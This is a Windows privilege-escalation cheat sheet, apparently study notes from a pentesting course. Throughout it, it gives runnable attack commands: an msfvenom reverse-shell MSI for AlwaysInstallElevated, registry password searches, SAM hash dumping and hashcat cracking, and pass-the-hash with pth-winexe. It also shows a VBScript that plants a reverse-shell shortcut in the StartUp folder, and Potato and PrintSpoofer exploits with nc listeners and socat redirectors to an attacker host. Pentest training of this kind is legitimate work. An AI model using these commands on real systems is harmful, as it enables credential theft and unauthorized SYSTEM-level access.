# Windows Privilege Escalation Cheat Sheet
Hi There today I published a checklist of strategies on Linux Privilege Escalation by [URL:Tib3rius]

## Windows Privilege Escalation Tools :

1- PowerUp: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
  example of usage: 
  - first get Powershell sessions 
    > powershell -exec bypass
    
    > . .\PowerUp.ps1
    
    > Invoke-AllChecks
  
2- SharpUp: 
  - Code: https://github.com/GhostPack/SharpUp
  - Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
  example of usage:
    > .\SharpUp.exe
  
3- Seatbelt:
  - Code: https://github.com/GhostPack/Seatbelt
  - Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
  example of usage:
  > .\Seatbelt.exe all
 
4- WinPEAS:  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
  example of usage:
  > .\WinPEAS.exe
  
5- accesschk.exe:
  - AccessChkis an old but still trustworthy tool for checking user access control rights.
  
## Windows Privilege Escalation Techniques:
1- Kernel Exploits (last choice):
  - First Enumerate Windows version/patch level (systeminfo).
  - Find exploits on (searchsploit, Google, ExploitDB, GitHub)
  - Compile & run
  
  - Tools to ease the proccess of finding the correct exploit:
  - Windows Exploit Suggester: https://github.com/bitsadmin/wesngPrecompiled 
  - Pro Tip: First Check Those Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
    - Watson: https://github.com/rasta-mouse/Watson
  
2- Service Exploits:
   - Insecure Service Permissions
      - NOTE: if you can change a service configuration but cannot stop/start the service you may fall on RABBIT HOLE
   - Unquoted Service Path
   - Weak Registry Permissions
   - Insecure Service Executables
   - DLL Hijacking
  
3- Registery Exploit:
  - AutoRun executables
      - check for writable AutoRun executables
        > .\winPEASany.exe quiet applicationsinfo
  
      - then use accesschk.exe to verify the permissions on each one:
        > .\accesschk.exe /accepteula -wvu "[file PATH]"
        
      
   - AlwaysInstallElevated
      - NOTE: Two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1. If either of these are missing or disabled, the exploit will not work.<br />
          >local machine:<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
          >current user:<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
      
      - check both registry values by winPEAS
          > .\winPEASany.exe quiet windowscreds
      - Then Create a new reverse shell with msfvenom, using the msi format, and save it with the .msi extension
          > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
        
4- Passwords
  - searching registery for passwords
    - Auto: 
      > .\winPEASany.exe quiet filesinfo userinfo
    - Manually:
      > reg query HKLM /f password /t REG_SZ /s<br />
      > reg query HKCU /f password /t REG_SZ /s
  - Saved Creds
    > .\winPEASany.exe quiet cmd windowscreds<br />
    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]<br />
  - Configuration Files
    > dir/s *pass* == *.config<br />
    > findstr/sipassword *.xml *.ini*.txt<br />
    > .\winPEASany.exe quiet cmd searchfast filesinfo<br />
  - SAM & SYSTEM
    - if you get SAM & SYSTEM can used to dump hashes by the following steps
      - first: Download the latest version of the creddump suite:
          > git clone https://github.com/Neohapsis/creddump7.git
      - Second: Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
          > python2 creddump7/pwdump.py SYSTEM SAM
      - Finally: Crack the admin user hash using hashcat:
          > hashcat-m 1000 --force [the hash] /usr/share/wordlists/rockyou.txt
      - Note: you can passing the hash concept using tools like: pth-winexe
          > pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
      - or spawn a SYSTEM level command prompt:
          > pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
      
      
5- Scheduled Tasks
  - CAUTION: Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
  - List all scheduled tasks your user:
    > schtasks /query /fo LIST /v
  - in PowerShell 
    > Get-ScheduledTask | where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
    
6- Startup Apps
  - Windows has a startup directory for apps that should start for all users:<br />
   >C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br />
   
   If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.<br />
   Note: the created file should be shortcut files with (.lnk) extention. 
   
   - First: check your permissions on the StartUp directory:
      > .\accesschk.exe/accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
   
   - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
   
```Set oWS= WScript.CreateObject("WScript.Shell")
sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink= oWS.CreateShortcut(sLinkFile)
oLink.TargetPath= "C:\PrivEsc\reverse.exe"
oLink.Save```

   - Finally: run the script:
      > cscript CreateShortcut.vbs
    
7- Installed Apps exploits:
  - enumerate running programs:
    > tasklist /v<br />
    > .\seatbelt.exe NonstandardProcesses<br />
    > .\winPEASany.exe quiet procesinfo<br />
  - when you see an intersting app search for exploits in (exploit-db, google, GitHub, others)
  
8- Hot Potato:
  - Potato.exe
    - https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe
    - working on Windows 7
        > .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
    
 9- Token Impersonation:
   - "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
    
   - Juicy Potato
      - https://github.com/ohpe/juicy-potato
      > C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
      - Note: "-c" argument take CLSID, so if it doesn't work check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run GetCLSID.ps1 PowerShell script.
    
   - Rogue Potato:
      - Latest of the "Potato" exploits.
        - GitHub: https://github.com/antonioCoco/RoguePotato
        - Blog: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
        - Compiled Exploit: https://github.com/antonioCoco/RoguePotato/releases
      - Usage:
        - On Kali:
        - First: Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows (192.168.1.22 is the Windows IP):
          > sudo socat tcp-listen:135,reuseaddr,fork tcp:[Windows IP Machine]:9999
        - Second: start listener
          > nc -lvp [Port assign in reverse.exe shell]
        
        - On Windows Victim machine:
        > C:\PrivEsc\RoguePotato.exe-r [Kali IP Machine] –l 9999 -e "C:\PrivEsc\reverse.exe"
        
     - PrintSpoofer:
        - PrintSpoofer is an exploit that targets the Print Spooler service.
            GitHub: https://github.com/itm4n/PrintSpoofer
            Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
        - Usage: 
        > C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
        
        
 10- User Privileges:
  - In Windows, user accounts and groups can be assigned specific “privileges”.These privileges grant access to certain abilities.Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
  - Highly detailed paper: https://github.com/hatRiot/token-priv
  - To list out Privileges:
    > whoami /priv
  - Note: that "disabled" in the state column is irrelevant here. we will talk about only "Enabled" privileges that your user has it.
  
  - SeImpersonatePrivilege:
    - Can be used to get PrivEsc by Juicy Potato exploit
  - SeAssignPrimaryPrivilege:
    - Can be used to get PrivEsc by Juicy Potato exploit
  - SeBackupPrivilegs:
    - Can be used to get PrivEsc by gaining access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
  - SeRestorePrivilege:
    - Can be used to get PrivEsc by multitude of ways to abuse this privilege:
        - Modify service binaries.
        - Overwrite DLLs used by SYSTEM processes
        - Modify registry settings
  - SeTakeOwnershipPrivilege:
    - The SeTakeOwnership Privilege lets the user take ownership over an object (the WRITE_OWNER permission).
    - Once you own an object, you can modify its ACL and grant yourself write access.
    - The same methods used with SeRestorePrivilegethen apply.
      
  - Other Privileges (More Advanced) can be used on Privilege Escalation process: 
      - SeTcbPrivilege
      - SeCreateTokenPrivilege
      - SeLoadDriverPrivilege
      - SeDebugPrivilege(used by getsystem)
## Privileges Escalition:
  1- Check your user (whoami) and groups (net user <username>)
  
  2- Run winPEASwith fast, searchfast, and cmdoptions.
  
  3- Run Seatbelt & other scripts as well!
  
  4- If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Windows PrivEsc cheatsheets online (e.g. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
  
  5- Spend some time and read over the results of your enumeration.
  
  `If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.`
  
  `Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\and C:\Program Files).Read through interesting files that you find, as they may contain useful information that could help escalate privileges.`
  
  `Try things that don’t have many steps first, e.g. registry exploits, services, etc.Have a good look at admin processes, enumerate their versions and search for exploits.Check for internal ports that you might be able to forward to your attacking machine.`
  
  `If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.This might be a process or file name you aren’t familiar with or even a username.At this stage you can also start to think about Kernel Exploits.`
  
